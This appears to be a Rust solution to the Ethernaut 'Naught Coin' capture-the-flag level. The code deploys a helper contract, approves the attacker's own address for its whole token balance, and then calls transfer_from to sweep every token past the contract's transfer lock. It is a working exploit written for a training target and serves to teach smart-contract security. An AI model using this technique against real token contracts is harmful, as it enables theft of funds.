use crate::abi::offshore::Offshore;
use async_trait::async_trait;
use ctf::ethernaut::lvl15_naught_coin::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = NaughtCoin::new(target.address, offender.clone());
        let hack_contract =
            Offshore::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        let all_money = contract.balance_of(offender.address()).await?;
        contract.approve(offender.address(), all_money).send().await?;
        contract
            .transfer_from(
                offender.address(),
                hack_contract.address(),
                all_money,
            )
            .send()
            .await?;
        //println!("Balance: {:?}",
        // hack_contract.balance().await?);

        Ok(())
    }
}
